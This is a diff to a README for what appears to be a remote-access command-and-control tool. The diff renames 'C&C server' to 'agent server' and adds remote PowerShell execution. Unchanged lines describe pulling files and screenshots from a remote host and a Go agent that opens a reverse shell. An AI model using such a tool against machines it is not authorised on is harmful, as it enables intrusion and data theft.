@@ -106,7 +106,7 @@ To initiate a file to be downloaded just specify the path to the file on the rem
 ```bash
 python client.py --command "download c:\Users\vboxuser\Desktop\document.docx document.docx"
 ```
-The file will be downloaded on the C&C server and stored on inside a local folder named received_file.
+The file will be downloaded on the agent server and stored on inside a local folder named received_file.
 
 ### Take a screenshot on the remote host
 The agent support taking a screenshot
@@ -114,8 +114,14 @@ To initiate take a screenshot just type:
 ```bash
 python client.py --command "screenshot"
 ```
-The file will be downloaded on the C&C server and stored on inside a local folder named received_file.
+The file will be downloaded on the agent server and stored on inside a local folder named received_file.
 
+### Run Powershell Command
+The agent support to run powershell command
+To run a powershell command type:
+```bash
+python client.py --command "powershell (Get-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload').PSObject.Properties"
+```
 ### Agent operation
 The Go agent, once started, will periodically check the server for commands to execute. If the "shell" command is received, it will attempt to establish a reverse shell connection to the listener address.
 
